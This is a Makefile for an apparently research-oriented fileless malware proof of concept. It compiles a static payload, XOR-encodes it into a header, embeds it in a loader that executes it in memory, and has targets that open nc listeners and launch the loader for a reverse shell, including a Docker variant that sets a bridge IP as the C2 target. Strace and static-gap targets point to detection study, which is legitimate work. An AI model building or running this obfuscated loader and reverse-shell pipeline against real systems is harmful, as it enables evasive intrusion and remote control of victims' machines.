# =============================================================================
# Makefile — Fileless Malware Loader
# =============================================================================
# Build pipeline:
#   1. Compile the inner `payload_elf` (static, so fexecve works without libc)
#   2. Compile the XOR encoder helper `gen_xor_header`
#   3. Run `gen_xor_header < payload_elf > src/payload_blob.h`
#      (XOR-encodes the ELF and produces a C header with the byte array)
#   4. Compile the outer `loader` that embeds payload_blob.h
#
# Targets:
#   make build    — full build (default)
#   make run      — run the loader (payload runs in-memory, no shell)
#   make shell    — start nc listener + run loader (FULL reverse shell demo)
#   make strace   — run with strace and capture syscall log
#   make verify   — run the static gap verification script
#   make clean    — remove all build artefacts
#
# WARNING: FOR ACADEMIC/RESEARCH USE ONLY INSIDE AN ISOLATED VM.
# =============================================================================

CC      = gcc
CFLAGS  = -Wall -Wextra -O2
SRCDIR  = src
BINDIR  = bin
DOCKER_GW = 172.17.0.1

# ---------- Binaries ---------------------------------------------------------
PAYLOAD_SRC    = $(SRCDIR)/payload.c
PAYLOAD_ELF    = $(BINDIR)/payload_elf

GEN_SRC        = $(SRCDIR)/gen_xor_header.c
GEN_BIN        = $(BINDIR)/gen_xor_header

PAYLOAD_BLOB   = $(SRCDIR)/payload_blob.h

LOADER_SRC     = $(SRCDIR)/loader.c
LOADER_BIN     = $(BINDIR)/loader

STRACE_LOG     = logs/strace_output.txt

# ---------- Default target ---------------------------------------------------
.PHONY: all
all: build

.PHONY: build
build: $(LOADER_BIN)
	@echo ""
	@echo "=============================================="
	@echo " Build COMPLETE"
	@echo "  Payload ELF : $(PAYLOAD_ELF)"
	@echo "  Loader      : $(LOADER_BIN)"
	@echo "  Blob header : $(PAYLOAD_BLOB)"
	@echo ""
	@echo " Run with:"
	@echo "   make run      — execute fileless loader (no shell)"
	@echo "   make shell    — full attack demo (nc listener + reverse shell)"
	@echo "   make strace   — capture syscall trace"
	@echo "   make verify   — static gap analysis"
	@echo "=============================================="

# ---------- Step 1: Compile payload (static binary) -------------------------
$(PAYLOAD_ELF): $(PAYLOAD_SRC) | $(BINDIR)
	@echo "[1/4] Compiling payload (static)..."
	$(CC) $(CFLAGS) -static -o $@ $<
	@echo "      Payload size: $$(du -sh $@ | cut -f1)"

# ---------- Step 2: Compile XOR encoder helper --------------------------------
$(GEN_BIN): $(GEN_SRC) | $(BINDIR)
	@echo "[2/4] Compiling XOR header generator..."
	$(CC) $(CFLAGS) -o $@ $<

# ---------- Step 3: Generate XOR-encoded payload header ----------------------
$(PAYLOAD_BLOB): $(PAYLOAD_ELF) $(GEN_BIN)
	@echo "[3/4] XOR-encoding payload ELF -> $(PAYLOAD_BLOB)"
	$(GEN_BIN) < $(PAYLOAD_ELF) > $@
	@echo "      Header preview (XOR key and transformed magic):"
	@head -6 $@

# ---------- Step 4: Compile loader with embedded payload blob ----------------
$(LOADER_BIN): $(LOADER_SRC) $(PAYLOAD_BLOB) | $(BINDIR)
	@echo "[4/4] Compiling loader (embeds XOR-encoded payload)..."
	$(CC) $(CFLAGS) -I$(SRCDIR) -o $@ $<

# ---------- Directory targets ------------------------------------------------
$(BINDIR):
	mkdir -p $(BINDIR)

logs:
	mkdir -p logs

# ---------- Run targets ------------------------------------------------------
.PHONY: run
run: build
	@echo ""
	@echo ">>> Running loader (payload executes in-memory) <<<"
	$(LOADER_BIN)

.PHONY: strace
strace: build logs
	@echo ""
	@echo ">>> Running loader under strace <<<"
	@echo "    Syscall log: $(STRACE_LOG)"
	@echo "    Watch for: memfd_create, execveat, socket, connect, dup2"
	@echo ""
	strace -f \
	       -e trace=memfd_create,write,execve,execveat,openat,read,mmap,socket,connect,dup2 \
	       -o $(STRACE_LOG) \
	       $(LOADER_BIN)
	@echo ""
	@echo "=== Key syscalls ==="
	@grep -E "(memfd_create|execveat|execve|socket|connect|dup2)" $(STRACE_LOG) || true
	@echo "=============================================="
	@echo "    Full log saved to: $(STRACE_LOG)"

# ---------- Static gap verification ------------------------------------------
.PHONY: verify
verify: build
	@bash scripts/verify_static_gap.sh $(LOADER_BIN) $(PAYLOAD_ELF)

# ---------- Full attack demo (reverse shell) ----------------------------------
# Opens a nc listener on 127.0.0.1:4444 in a background subshell,
# waits 1 second for it to bind, then launches the loader.
# The payload will connect back and you should see a shell prompt.
.PHONY: shell
shell: build
	@echo ""
	@echo "============================================================"
	@echo " FULL ATTACK DEMO — Reverse Shell"
	@echo " Listener : 127.0.0.1:4444 (nc)"
	@echo " Loader   : $(LOADER_BIN)"
	@echo " Stop     : type 'exit' in the shell, or Ctrl+C"
	@echo "============================================================"
	@echo ""
	@echo "[*] Starting nc listener on 127.0.0.1:4444 ..."
	@nc -l 127.0.0.1 4444 & NC_PID=$$! ; \
	 sleep 1 ; \
	 echo "[*] Launching fileless loader ..." ; \
	 $(LOADER_BIN) ; \
	 wait $$NC_PID 2>/dev/null || true

# ---------- Docker reverse-shell demo ----------------------------------------
# Recompiles payload with the Docker bridge IP (172.17.0.1) as the C2 target,
# rebuilds the image, and gives exact commands for both terminals.
.PHONY: docker-shell
docker-shell:
	@echo ""
	@echo "============================================================"
	@echo " DOCKER ATTACK DEMO — Reverse Shell"
	@echo " C2 target : $(DOCKER_GW):4444 (Docker bridge → host)"
	@echo "============================================================"
	@echo ""
	@echo "[1/3] Recompiling payload with Docker bridge C2 IP..."
	$(CC) $(CFLAGS) -static \
	    -DC2_IP='"$(DOCKER_GW)"' -DC2_PORT=4444 \
	    -o $(PAYLOAD_ELF) $(PAYLOAD_SRC)
	$(GEN_BIN) < $(PAYLOAD_ELF) > $(PAYLOAD_BLOB)
	$(CC) $(CFLAGS) -I$(SRCDIR) -o $(LOADER_BIN) $(LOADER_SRC)
	@echo "[2/3] Rebuilding Docker image..."
	cp $(LOADER_BIN) docker-test/loader
	docker build -t fileless-poc:latest docker-test/ -q
	@echo ""
	@echo "[3/3] Ready. Run these in TWO separate terminals:"
	@echo ""
	@echo "  TERMINAL 1 (listener — run this first):"
	@echo "    ncat -lvp 4444"
	@echo ""
	@echo "  TERMINAL 2 (attack):"
	@echo "    docker run --rm fileless-poc:latest"
	@echo ""
	@echo "  A shell prompt should appear in Terminal 1."
	@echo "============================================================"
clean:
	rm -rf $(BINDIR) $(PAYLOAD_BLOB) logs
	@echo "Cleaned."
